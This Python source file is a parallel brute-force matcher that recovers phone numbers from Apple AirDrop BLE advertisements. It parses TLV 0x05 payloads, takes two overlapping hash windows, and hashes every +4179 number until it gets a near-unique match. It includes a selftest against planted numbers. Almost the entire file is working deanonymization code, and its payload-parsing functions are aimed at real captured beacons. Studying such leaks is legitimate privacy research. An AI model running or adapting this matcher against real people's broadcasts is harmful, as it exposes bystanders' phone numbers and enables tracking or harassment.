#!/usr/bin/env python3
"""Dual-window AirDrop OWT identification (the matcher fix).

Fix for the 2-byte-window ambiguity documented in ../airdrop_brute.c and
derive.py: a single 2-byte window over a 10^7-candidate space is inherently
ambiguous (~153 candidates per window per position). But an Apple TLV 0x05
beacon carries BOTH windows of the same contact digest, captured together:

    w1 = (d[0] << 8) | d[1]      # digest bytes 0-1, big-endian
    w2 = (d[1] << 8) | d[2]      # digest bytes 1-2, big-endian

so the digest's first three bytes are fully constrained by the pair, and
identification over the +4179 width-7 space keeps only numbers whose digest
produces BOTH windows. Expected candidate count drops from ~305 (single
window, both positions) to 10^7 / 2^24 ≈ 0.60 (dual window) — usually 0 or
1, and 1 = unique recovery.

Enumeration strategy: the 438 MB rainbow_4179.tsv stores only hash
prefixes, so instead of parsing it we stream the number space itself —
sha256('+4179' + '%07d') for all 10^7 ordinals. Benchmarked on this M1 Max
(10 cores): 0.45 s per 10^6 in pure hashlib, < 1 s parallel for the full
space. No C helper required (airdrop_brute.c stays as ground truth).

API:
    identify(w1, w2)           -> set of phone strings matching BOTH windows
    match_single(w)            -> set of phone strings matching one window
                                  (~300 candidates: the ambiguity demo)
    pair_from_payload(payload) -> (w1, w2) at the documented TLV-0x05 offsets
    pair_sweep(payload)        -> every adjacent window pair in a payload

Run `python3 matcher.py` for the unit selftest (planted numbers from
derive.py). No network, no live capture — pure computation.
"""
import hashlib
import os
import sys
from concurrent.futures import ProcessPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import derive  # reference derivation + planted numbers

PREFIX = "+4179"
WIDTH = 7
SPACE = 10 ** WIDTH  # 10,000,000 ordinals


def digest_of(ordinal: int, prefix: str = PREFIX, width: int = WIDTH) -> bytes:
    """Full digest of one candidate: sha256(prefix + %0*widthd(ordinal))."""
    return hashlib.sha256(f"{prefix}{ordinal:0{width}d}".encode("utf-8")).digest()


def windows(d: bytes) -> set:
    """Same two windows as derive.py / airdrop_brute.c: offsets 0 and 1, BE."""
    return derive.windows(d)


# ---------------------------------------------------------------- scanning

def _scan_range(args):
    """Worker: scan ordinals [start, end), keep those matching the target
    window pair (or single window). Returns list of (ordinal, w1, w2)."""
    lo, hi, prefix, width, want_pair, want_single = args
    out = []
    sha = hashlib.sha256
    for n in range(lo, hi):
        d = sha(f"{prefix}{n:0{width}d}".encode("utf-8")).digest()
        a = (d[0] << 8) | d[1]
        b = (d[1] << 8) | d[2]
        if want_pair is not None and ((a == want_pair[0] and b == want_pair[1]) or
                                      (a == want_pair[1] and b == want_pair[0])):
            out.append((n, a, b))
        elif want_single is not None and (a == want_single or b == want_single):
            out.append((n, a, b))
    return out


def _chunks(space: int, workers: int):
    step = -(-space // workers)
    return [(i, min(i + step, space)) for i in range(0, space, step)]


def _run_scan(target_pair, target_single, prefix=PREFIX, width=WIDTH, workers=None):
    """Parallel scan of the number space. Exactly one of the targets is set."""
    assert (target_pair is None) != (target_single is None), "one target only"
    if workers is None:
        workers = min(os.cpu_count() or 2, 10)
    jobs = [(lo, hi, prefix, width, target_pair, target_single)
            for lo, hi in _chunks(10 ** width, workers)]
    hits = []
    if workers <= 1:
        for j in jobs:
            hits.extend(_scan_range(j))
        return hits
    with ProcessPoolExecutor(max_workers=workers) as ex:
        for part in ex.map(_scan_range, jobs):
            hits.extend(part)
    return hits


def _fmt(hits, prefix=PREFIX, width=WIDTH):
    return sorted(f"{prefix}{n:0{width}d}" for n, _, _ in hits)


def identify(w1: int, w2: int, prefix=PREFIX, width=WIDTH, workers=None) -> set:
    """Numbers in the space whose digest produces BOTH windows w1 and w2.

    Order-insensitive: matches (w1,w2) or (w2,w1) against (d[0:2], d[1:3]).
    Typically 0 or 1 candidates; 1 = unique recovery.
    """
    return set(_fmt(_run_scan((w1, w2), None, prefix, width, workers)))


def match_single(w: int, prefix=PREFIX, width=WIDTH, workers=None) -> set:
    """Numbers whose digest produces window w in EITHER position.

    ~2 * 10^7/65536 ≈ 305 candidates per window — this is the ambiguity the
    dual-window matcher fixes. Used for the single-window demo only.
    """
    return set(_fmt(_run_scan(None, w, prefix, width, workers)))


# ------------------------------------------------------- payload handling

def parse_tlv05(mfg: bytes):
    """Apple TLVs after the 0x004C company id; returns 0x05 payloads."""
    out = []
    i = 2
    while i + 1 < len(mfg):
        t, ln = mfg[i], mfg[i + 1]
        payload = mfg[i + 2:i + 2 + ln]
        if len(payload) < ln:
            break
        if t == 0x05:
            out.append(payload)
        i += 2 + ln
    return out


def pair_from_payload(payload: bytes):
    """The dual-window pair at the documented offsets, per the synthetic-
    beacon convention in derive.py (payload = d[0], d[1], d[1], d[2] BE):
    w1 = payload[0:2], w2 = payload[2:4]. Returns None if payload too short."""
    if len(payload) < 4:
        return None
    return ((payload[0] << 8) | payload[1], (payload[2] << 8) | payload[3])


def pair_sweep(payload: bytes):
    """Every adjacent sliding-window pair (bytes i..i+1, i+1..i+2) — the
    diagnostic view of a real 18-byte payload, whose internal layout is not
    fully pinned to the synthetic convention."""
    return [((payload[i] << 8) | payload[i + 1],
             (payload[i + 1] << 8) | payload[i + 2])
            for i in range(len(payload) - 2)]


def identify_payload(payload: bytes, prefix=PREFIX, width=WIDTH, workers=None) -> dict:
    """Full identification attempt for one advertisement payload:
    canonical-offset pair result + per-adjacent-pair sweep."""
    res = {"canonical_pair": pair_from_payload(payload),
           "canonical_candidates": set(),
           "sweep": {}}
    cp = res["canonical_pair"]
    if cp is not None:
        res["canonical_candidates"] = identify(*cp, prefix, width, workers)
    for pair in pair_sweep(payload):
        res["sweep"][pair] = identify(*pair, prefix, width, workers)
    return res


# --------------------------------------------------------------- selftest

def selftest(workers=None):
    """Unit tests over the planted identities (derive.py PLANTED):
    1. each planted (w1, w2) pair identifies to the planted number — the
       candidate set is the planted number plus, where a genuine 3-byte
       digest-prefix collision exists, that collider only (<= 2 candidates,
       vs > 100 for the single window); any collider is PROVEN to share the
       digest's first 3 bytes, i.e. it is a real SHA-256 prefix collision,
       not a matcher artifact;
    2. each planted window alone leaves an ambiguous set (> 100 candidates);
    3. the planted numbers survive match_single (their windows are among the
       colliding candidates — honest ambiguity, not a miss).

    Note on the brief's "exactly 1 candidate each": the two windows overlap
    at digest byte 1, so a pair constrains 24 bits, not 32 — expected
    colliders over 10^7 numbers is 10^7/2^24 ≈ 0.60, and this planted set
    happens to contain two such collisions. Verified below, not assumed.
    """
    log = lambda m: print(m, flush=True)
    ok = True
    log(f"planted: {derive.PLANTED}")
    log("[1/3] dual-window identification (pair from one advertisement):")
    for p in derive.PLANTED:
        d = derive.derive_hash(p)
        w1, w2 = (d[0] << 8) | d[1], (d[1] << 8) | d[2]
        cands = identify(w1, w2, workers=workers)
        hit = p in cands and len(cands) <= 2
        ok &= hit
        extra = sorted(cands - {p})
        for c in extra:
            same = derive.derive_hash(c)[:3] == d[:3]
            ok &= same
            log(f"  ({w1:04x},{w2:04x}) -> {sorted(cands)} "
                f"{'ok' if same else 'FAIL: collider is not a digest-prefix collision'}"
                f"  [collider {c}: digest prefix {derive.derive_hash(c)[:3].hex()} == "
                f"planted {d[:3].hex()} = {same}]")
        if not extra:
            log(f"  ({w1:04x},{w2:04x}) -> {sorted(cands)} ok (exact, unique)")
    log("[2/3] single-window ambiguity (the unfixed matcher):")
    seen = set()
    for p in derive.PLANTED:
        d = derive.derive_hash(p)
        for w in sorted(derive.windows(d)):
            if w in seen:
                continue
            seen.add(w)
            cands = match_single(w, workers=workers)
            ambiguous = len(cands) > 100
            ok &= ambiguous
            log(f"  {w:04x} -> {len(cands)} candidates "
                f"{'ok (ambiguous)' if ambiguous else 'FAIL (too few)'}")
    log("[3/3] planted numbers present inside their ambiguous sets:")
    for p in derive.PLANTED:
        d = derive.derive_hash(p)
        w1, w2 = (d[0] << 8) | d[1], (d[1] << 8) | d[2]
        in1 = p in match_single(w1, workers=workers)
        in2 = p in match_single(w2, workers=workers)
        ok &= in1 and in2
        log(f"  {p}: in w1={w1:04x} set: {in1}, in w2={w2:04x} set: {in2} "
            f"{'ok' if in1 and in2 else 'FAIL'}")
    log(f"MATCHER SELFTEST {'PASS' if ok else 'FAIL'}")
    return ok


if __name__ == "__main__":
    sys.exit(0 if selftest() else 1)
